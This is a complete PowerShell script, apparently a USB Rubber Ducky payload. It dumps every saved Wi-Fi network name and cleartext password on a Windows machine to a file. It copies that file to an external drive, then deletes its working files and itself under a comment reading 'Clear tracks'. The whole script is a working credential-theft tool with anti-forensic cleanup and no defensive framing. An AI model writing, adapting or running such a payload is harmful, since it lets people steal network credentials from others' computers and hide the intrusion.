# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p
$PC_NAME = "$env:computername"

# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File "$PC_NAME.txt" -Append -InputObject $a
}


copy-item "C:\wipass\$PC_NAME.txt" E:\Data\wifipass


# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass

# remove ducky payload
rm wifipass.ps1